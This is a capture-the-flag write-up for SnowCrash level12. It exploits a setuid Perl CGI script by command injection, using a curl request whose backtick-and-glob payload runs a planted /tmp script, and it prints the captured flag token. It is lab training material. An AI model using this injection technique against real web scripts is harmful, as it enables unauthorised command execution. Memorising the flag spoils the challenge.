# LEVEL12

ls -la : 

```
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
```

``` 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1]; # second param
  $xx = $_[0]; # first param
  $xx =~ tr/a-z/A-Z/; # change all lowercase to uppercase  
  $xx =~ s/\s.*//; # remove all characters after the first space
  @output = `egrep "^$xx" /tmp/xd 2>&1`; # backtick executes a command 
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

Create script in `/tmp/TOKEN`

```
#!/bin/sh
echo `whoami` `getflag` > /tmp/TOKEN
```

Run : 

```
level12@SnowCrash:~$ curl localhost:4646?x='`/*/TOKEN`'
flag12 Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
